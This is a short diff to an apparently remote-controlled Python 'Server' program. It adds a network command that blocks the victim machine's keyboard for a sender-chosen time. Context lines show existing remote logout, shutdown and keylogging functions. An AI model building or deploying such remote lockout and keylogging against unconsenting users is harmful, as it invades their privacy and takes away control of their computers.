@@ -13,6 +13,7 @@ import keyboard #pip install keyboard
 import csv
 import codecs
 import sys
+import time
 class Server(object):
     def main_form(self):
         """Creates the interface window"""
@@ -63,6 +64,13 @@ class Server(object):
     def magicFunction(self,Str:bytes):
         if Str.decode()=='Hello':
             print('Hello')
+        elif Str.decode().find('LOCKKEYBOARD') != -1:
+            tmp = Str.decode().split(' ')
+            for i in range(180):
+                keyboard.block_key(i)
+            time.sleep(int(tmp[1]))
+            for i in range(180):
+                keyboard.unblock_key(i)
         elif Str.decode().find('LOGOUT')!=-1:
             os.system('shutdown -l')
         elif Str.decode().find('SHUTDOWN')!=-1:
@@ -216,7 +224,6 @@ class Server(object):
     #TODO: Unhook
     def stopKeylogging(self):
         keyboard.unhook(self.__callback)
-    ##################################################################################
     def Close(self):
         s.close()
         close_it=threading.Thread(target=self.root.destroy,daemon=True)
